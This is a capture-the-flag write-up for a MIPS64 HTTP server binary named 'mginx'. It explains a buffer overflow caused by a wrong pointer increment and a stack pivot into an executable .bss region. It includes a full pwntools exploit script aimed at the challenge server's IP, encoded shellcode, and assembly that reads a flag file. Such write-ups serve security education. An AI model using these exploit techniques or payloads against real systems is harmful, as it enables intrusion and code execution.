## mginx

The binary is a http server of mips64 architecture, which receives our http requests and give responses. The logic is quite simple, and the server only parses several params in the header.

### vuln

A problem exists when we concatenate the content data after the header. The code is like this:

```c
content_ptr = header_ptr + header_len;
while ((content_len != 0 && (read_sz = read(0, content_ptr, content_len), 0 < read_sz))) {
    content_ptr = content_ptr + (int)content_len;   // wrong
    content_len = content_len - read_sz;
}
```

As we can see, `content_ptr` should add `read_sz` rather than `content_len`. As a result, we can send small data to trigger large span of `content_ptr`, thus to cause buffer overflow.

### rop

The binary is dynamically linked and remote environment has ASLR opened, so we need to use some gadgets in the binary. 

One possible way is to leak library address and call library functions. However, it requires a long and subtle chain, and the useful gadgets in the binary is few. I didn't choose this way.

Instead, I managed to jump back and trigger stack pivot. Because of the overflow, we can easily control values of `gp`, `ra` and `s8/fp`. I change `fp` info some address on .bss section, and `ra` back to here:

```assembly
.text:00000001200018C4 loc_1200018C4:                           # CODE XREF: main+510↓j
.text:00000001200018C4                                          # main+51C↓j ...
.text:00000001200018C4                 daddiu  $v0, $fp, 0x88
.text:00000001200018C8                 li      $a2, 0x1000      # nbytes
.text:00000001200018CC                 move    $a1, $v0         # buf
.text:00000001200018D0                 move    $a0, $zero       # fd
.text:00000001200018D4                 dla     $v0, read
.text:00000001200018D8                 move    $t9, $v0
.text:00000001200018DC                 jalr    $t9 ; read
.text:00000001200018E0                 nop
```

Thus, we can read our new http header / content in the .bss section, which is RWX. We can read our shellcode on it, and do overflow again to control pc there. 

### exploit

```python
from pwn import *
context.arch = 'mips64'
context.endian = 'big'
context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

if not args['REMOTE']:
    r = process(["qemu-mips64", "./mginx"])
    #r = process(["qemu-mips64", "-g", "1234", "./mginx"])
else:
    r = remote("124.156.129.96", 8888)

read_gadget = 0x1200018C4
bss         = 0x120012800

def senddata(data):
    sleep(0.1)
    r.send(data)

###############################
h = "GET / HTTP/1.1\r\n"
h += "Connection: not-keep-alive\r\n"
h += "Content-Length: 512"
h = h.ljust(0x250-4, 'a')
h += "\r\n\r\n"

sh = 'b'*(0x1e0-1)
sh += p64(0x000000012001a250)       # gp 
sh += p64(bss)                      # s8 / fp
sh += p64(read_gadget)              # ra
sh = sh.ljust(0x200-6, 'x')

senddata(h)
for i in range(6):
    senddata('a')
senddata(sh)

###############################

h = "GET / HTTP/1.1\r\n"
h += "Connection: not-keep-alive\r\n"
h += "Content-Length: 512"
h = h.ljust(0x250-4, 'a')
h += "\r\n\r\n"

data = 'x'*7
#data += "<\x0c/b5\x8cin\xaf\xac\xff\xf4<\r/s5\xadh\x00\xaf\xad\xff\xf8\xaf\xa0\xff\xfcg\xa4\xff\xf4(\x05\xff\xff(\x06\xff\xff$\x02\x13\xc1\x01\x01\x01\x0c))"
data += "<\r/f5\xadla\x00\rl85\xadg\x00\x00\rl8\xff\xad\x00\x00\x03\xa0 %\x00\xa5(&\x00\xc60&$\x02\x13\x8a\x00'u\x0c\x00@ %\x03\xa0(%$\x06\x00P$\x02\x13\x88\x00'u\x0c$\x04\x00\x01\x03\xa0(%$\x06\x00P$\x02\x13\x89\x00'u\x0c"
data = data.ljust(0x200-6-8-3, '\x00')
data += p64(0x00000001200136d0)
data = data.ljust(0x200-6, 'x')

senddata(h)
for i in range(6):
    senddata('a')
senddata(data)

r.interactive()

###############################

""" orw shellcode
dli $t1, 0x2f666c6167000000
sd $t1, ($sp)
move $a0, $sp
xor $a1, $a1, $a1
xor $a2, $a2, $a2
li $v0, 0x138a
syscall 40404
move $a0, $v0
move $a1, $sp
li $a2, 0x50
li $v0, 0x1388
syscall 40404
li $a0, 1
move $a1, $sp
li $a2, 0x50
li $v0, 0x1389
syscall 40404
"""
```
